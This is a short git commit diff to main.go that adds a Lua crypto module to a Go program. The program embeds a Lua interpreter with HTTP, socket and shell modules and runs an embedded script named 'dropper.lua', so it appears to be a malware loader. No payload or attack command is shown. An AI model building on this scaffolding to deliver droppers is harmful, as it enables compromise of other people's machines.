a69a8cacc20435d453383ff6f1abd29a7bf84e3c
cyian-1756 <devnull64@vfemail.net>
2020-10-28 03:55:22 -0400

    Added crypto

--- main.go
+++ main.go
@@ -6,6 +6,7 @@ import (
 	"github.com/cjoudrey/gluahttp"
 	"github.com/nubix-io/gluasocket"
 	"github.com/otm/gluash"
+	"github.com/cyian-1756/gluacrypto"
 	lua "github.com/yuin/gopher-lua"
 	luajson "layeh.com/gopher-json"
 )
@@ -19,6 +20,7 @@ func main() {
 	L.PreloadModule("http", gluahttp.NewHttpModule(&http.Client{}).Loader)
 	gluasocket.Preload(L)
 	luajson.Preload(L)
+	gluacrypto.Preload(L)
 	L.PreloadModule("sh", gluash.Loader)
 	data, err := Asset("dropper.lua")
 	if err != nil {
